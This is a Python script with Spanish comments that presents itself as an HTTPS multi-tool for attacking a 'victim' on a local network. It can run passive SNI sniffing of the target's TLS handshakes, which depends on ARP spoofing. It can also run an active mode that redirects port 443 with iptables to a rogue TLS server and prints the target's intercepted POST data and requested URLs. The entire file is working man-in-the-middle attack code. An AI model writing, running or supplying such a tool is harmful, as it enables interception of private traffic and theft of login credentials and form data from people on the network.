#!/usr/bin/env python3
# Autor = Pepe >:) 

import scapy.all as scapy
import http.server
import subprocess
import argparse
import ssl
import sys
from scapy.layers.tls.all import TLS, TLSClientHello, ServerName
from termcolor import colored

scapy.load_layer("tls")

def get_arguments():
    parser = argparse.ArgumentParser(description="HTTPS Multi-Tool: Sniffer y Decryptor")
    
    parser.add_argument("-m", "--mode", dest="mode", choices=["sni", "decrypt"], required=True, help="Modo: 'sni' (pasivo) o 'decrypt' (activo)")
    parser.add_argument("-i", "--interface", dest="interface", help="Interfaz de red (Solo modo SNI)")
    parser.add_argument("-t", "--target", dest="target_ip", help="IP de la víctima (Solo modo SNI)")
    
    parser.add_argument("--cert", dest="cert_file", help="Ruta al archivo .pem (Certificado + Key) para modo decrypt")
    parser.add_argument("--port", dest="port", type=int, default=8443, help="Puerto de escucha para modo decrypt (Default: 8443)")

    args = parser.parse_args()
    return args

def manage_iptables(port, enable=True):
    action = "-A" if enable else "-D"
    cmd = [
        "iptables", "-t", "nat", action, "PREROUTING",
        "-p", "tcp", "--dport", "443",
        "-j", "REDIRECT", "--to-port", str(port)
    ]

    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        status = "Activada" if enable else "Eliminada"
        color = "green" if enable else "yellow"
        print(colored(f"[*] Regla IPtables {status} (Tráfico 443 -> {port})", color))
    except subprocess.CalledProcessError:
        print(colored(f"[!] Error gestionando IPTables. ¿Eres root?", "red"))
    except Exception as e:
        print(colored(f"[!] Error inesperado en IPTables: {e}", "red"))

#SNI Sniffer

def process_packet_sni(packet):
    # Verificamos si es un paquete de inicio de conexión (ClientHello)
    if packet.haslayer(TLSClientHello):
        try:
            for extension in packet[TLSClientHello].ext:
                if isinstance(extension, ServerName):
                    domain = extension.servername.decode('utf-8')
                    print(colored(f"\n[SNI] Dominio detectado: {domain}", "magenta", attrs=['bold']))
        except Exception:
            pass
    
    # DEBUG: Si es tráfico TCP 443 pero NO es un Hello (es tráfico de datos cifrados)
    # Esto nos confirma que el ARP Spoofing funciona y los paquetes llegan.
    elif packet.haslayer(scapy.TCP) and packet.haslayer(scapy.Raw):
        # Imprimimos un punto sin salto de línea para ver "actividad"
        sys.stdout.write(colored(".", "green"))
        sys.stdout.flush()

def start_sni_sniffer(interface, target_ip):
    print(colored(f"\n--- MODO SNI (PASIVO) ACTIVO en {interface} ---", "white", attrs=['bold']))
    print(colored(f"[*] Filtrando tráfico de: {target_ip}", "blue"))
    
    bpf_filter = f"tcp port 443 and src host {target_ip}"
    scapy.sniff(iface=interface, filter=bpf_filter, prn=process_packet_sni, store=0)


#SSL Decryptor

class SecureRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8')

            print(colored("\n" + "*"*50, "red"))
            print(colored(f"[!] HTTPS DECRYPTED DATA (POST):", "red", attrs=['bold']))
            print(colored(f"URL: {self.path}", "yellow"))
            print(colored(f"DATA: {post_data}", "green"))
            print(colored("*"*50 + "\n", "red"))
        except Exception:
            pass
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Servidor Honeypot - Datos recibidos")

    def do_GET(self):
        print(colored(f"[+] Petición GET desencriptada: {self.path}", "cyan"))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Has sido interceptado :)</h1>")

def start_ssl_decryptor(cert_file, port):
    print(colored(f"\n--- MODO DECRYPT (ACTIVO) ---", "white", attrs=['bold']))
    print(colored(f"[*] Escuchando en 0.0.0.0:{port}", "blue"))
    print(colored(f"[*] Usando certificado: {cert_file}", "blue"))

    manage_iptables(port, enable=True)

    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=cert_file)

        server_address = ('0.0.0.0', port)
        httpd = http.server.HTTPServer(server_address, SecureRequestHandler)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

        print(colored("[*] Servidor HTTPS iniciado. Presiona Ctrl+C para salir.", "green"))
        httpd.serve_forever()

    except KeyboardInterrupt:
        print(colored("\n[!] Deteniendo servidor...", "yellow"))
    
    except Exception as e:
        print(colored(f"[!] Error al iniciar el servidor: {e}", "red"))

    finally:
        print(colored("[*] Restaurando configuración de red...", "blue"))
        manage_iptables(port, enable=False)



def main():
    if len(sys.argv) < 2:
        print(colored("[!] Uso: sudo python3 https_multitool.py -h", "red"))
        sys.exit(1)

    args = get_arguments()

    if args.mode == "sni":
        if not args.interface or not args.target_ip:
            sys.exit(colored("[!] Error: Modo SNI requiere -i (interfaz) y -t (target)", "red"))
        start_sni_sniffer(args.interface, args.target_ip)

    elif args.mode == "decrypt":
        if not args.cert_file:
            sys.exit(colored("[!] Error: Modo Decrypt requiere --cert server.pem", "red"))
        start_ssl_decryptor(args.cert_file, args.port)

if __name__ == "__main__":
    main()